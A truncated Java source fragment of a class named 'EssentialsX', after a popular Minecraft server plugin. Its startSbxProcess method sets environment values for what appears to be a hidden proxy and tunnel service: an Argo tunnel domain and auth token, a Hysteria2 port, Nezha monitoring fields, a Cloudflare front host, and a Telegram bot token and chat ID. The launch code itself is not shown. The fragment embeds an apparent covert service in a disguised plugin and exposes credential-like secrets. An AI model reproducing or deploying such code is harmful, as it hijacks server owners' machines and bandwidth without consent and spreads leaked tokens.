...
public class EssentialsX extends JavaPlugin {
    ...
    private void startSbxProcess() throws Exception {
        ...
        env.put("UUID", "a217d527-bd5e-4ef0-b899-d36627af0ddd");
        env.put("FILE_PATH", "./logs");
        env.put("NEZHA_SERVER", "");
        env.put("NEZHA_PORT", "");
        env.put("NEZHA_KEY", "");
        env.put("ARGO_PORT", "8001");
        env.put("ARGO_DOMAIN", "lememdev-sg.3211.qzz.io");
        env.put("ARGO_AUTH", "eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiZGRmNjAxYWMtYTg1OS00NWZiLTk0NWItMWExZTUwZDNjZDhmIiwicyI6IlpUZGpNVGRqTWpVdE16bGpNUzAwTURsakxUZ3lOR0l0T0RZek5EY3pPVEptTVRsaSJ9");
        env.put("S5_PORT", "");
        env.put("HY2_PORT", "2034");
        env.put("TUIC_PORT", "");
        env.put("ANYTLS_PORT", "");
        env.put("REALITY_PORT", "");
        env.put("ANYREALITY_PORT", "");
        env.put("UPLOAD_URL", "");
        env.put("CHAT_ID", "6708152473");
        env.put("BOT_TOKEN", "7615526848:AAGVWjn03O5rdWiacPhtcl6TexJ7DQFTFb8");
        env.put("CFIP", "cdns.doon.eu.org");
        env.put("CFPORT", "443");
        env.put("NAME", "lememdev");
